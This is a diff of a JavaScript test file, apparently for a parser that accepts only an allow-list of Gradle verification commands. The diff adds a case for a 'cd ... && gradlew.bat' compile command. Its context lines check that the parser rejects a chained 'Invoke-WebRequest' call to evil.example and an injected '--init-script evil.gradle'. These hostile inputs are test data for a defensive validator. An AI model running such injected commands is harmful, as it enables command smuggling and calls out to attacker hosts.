@@ -841,6 +841,14 @@ test("pre-review local verification gate catches Kotlin/Lombok compile errors be
             args: [":broker4j:test", "--tests", "SilentRequestThrottleTest", "--max-workers=2", "--no-daemon"],
         },
     );
+    assert.deepEqual(
+        parseAllowedGradleVerificationCommand("cd authenticator/PhoneFactor && .\\gradlew.bat :app:compileProductionDebugKotlin :app:compileProductionDebugAndroidTestKotlin"),
+        {
+            command: ".\\gradlew.bat :app:compileProductionDebugKotlin :app:compileProductionDebugAndroidTestKotlin",
+            executable: ".\\gradlew.bat",
+            args: [":app:compileProductionDebugKotlin", ":app:compileProductionDebugAndroidTestKotlin"],
+        },
+    );
     assert.equal(parseAllowedGradleVerificationCommand(".\\gradlew.bat :common4j:test; Invoke-WebRequest https://evil.example"), null);
     assert.equal(parseAllowedGradleVerificationCommand(".\\gradlew.bat --init-script evil.gradle :common4j:test"), null);
     assert.equal(parseAllowedGradleVerificationCommand(".\\gradlew.bat publishToMavenLocal"), null);
